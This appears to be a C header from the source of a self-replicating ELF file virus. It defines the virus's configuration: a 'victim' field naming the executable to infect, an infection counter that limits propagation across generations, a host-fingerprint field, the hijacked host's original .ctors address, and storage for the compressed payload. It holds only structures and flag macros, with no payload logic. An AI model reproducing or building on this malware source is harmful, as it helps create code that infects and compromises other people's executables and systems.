
#ifndef	WRCONFIG_H
#define	WRCONFIG_H

#pragma pack(1)

#define	VICTIM_LEN	32


/* wrdynconfig
 *
 * only active after the first infection has taken place.
 */

typedef struct {
	unsigned char	cnul;	/* constant 0x00 */
	unsigned int	flags;	/* various flags, see below */

	/* flag dependant fields
	 */
	unsigned int	icount;	/* (WRF_GENERATION_LIMIT) infection count */
	unsigned int	curhost;	/* (WRF_KEEP_FINGERPRINT) this host */

	unsigned char	xxx_temp[8];	/* FIXME: temporary filename for testing */
} wrdynconfig;

/* flag access macros
 */
#define	WRF_ISSET(flags,flagmask) \
	(((flags) & (flagmask)) == (flagmask))
#define	WRF_SET(flags,flagmask) \
	(flags) |= (flagmask);
#define	WRF_CLEAR(flags,flagmask) \
	(flags) &= ~(flagmask);
#define	WRF_TOGGLE(flags,flagmask) \
	(flags) ^= (flagmask);

/* limit propagation by icount, icount is decreased until it reaches 0 */
#define	WRF_GENERATION_LIMIT	0x00000001
/* always keep a fingerprint of the current host in curhost */
#define	WRF_GET_FINGERPRINT	0x00000002


typedef struct {
	unsigned long int	wr_start;	/* virtual start address */
	unsigned long int	decomp_len;
	unsigned long int	wr_oldctors;	/* original .ctors address */

	unsigned long int	elf_base;	/* &elf_header[0] of host */

	union {
		/* upon first infection the victim array is used to carry the
		 * name of the executeable to be infected.
		 * afterwards (i.e. any other infection) this space is
		 * recycled for data specifying various properties of the
		 * virus. see wrcore.c for a more in-depth explanation.
		 *
		 * first infection (set by the "initial" program):
		 *    victim = filename to be infected
		 *    vcfgptr = pointer to memory which will overwrite the
		 *        vcfg structure.
		 */
		struct {
			unsigned char	victim[VICTIM_LEN];
			void *		vcfgptr;
		} vinit;

		wrdynconfig	vcfg;
	} dyn;

	/* compression related data
	 */
	unsigned long int	cmprlen;
	unsigned char		llstuff;
	unsigned short int	hl1stuff;
	unsigned char		hl2stuff;
	unsigned char		hf2stuff;
} wrconfig;

#endif


